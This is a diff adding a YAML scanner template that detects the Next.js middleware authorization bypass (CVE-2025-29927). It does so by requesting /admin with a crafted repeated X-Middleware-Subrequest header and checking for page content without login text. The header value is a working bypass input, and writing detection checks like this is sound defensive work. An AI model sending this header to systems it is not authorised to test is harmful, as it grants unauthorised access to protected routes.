@@ -1,0 +1,27 @@
+id: nextjs-middleware-subrequest-bypass
+name: "Next.js middleware authorization bypass via x-middleware-subrequest (CVE-2025-29927)"
+severity: high
+description: "A protected route returns page content only when the internal x-middleware-subrequest header is supplied, indicating middleware authorization can be skipped."
+tech: [nextjs]
+tags: [auth-bypass, cve]
+cve: CVE-2025-29927
+cwe: CWE-285
+request:
+  method: GET
+  path: /admin
+  headers:
+    X-Middleware-Subrequest: "middleware:middleware:middleware:middleware:middleware"
+control:
+  headers: {}
+matchers-condition: and
+matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words: ["<html", "<!doctype html"]
+    condition: or
+  - type: word
+    part: body
+    words: ["sign in", "log in", "login", "unauthorized"]
+    negative: true
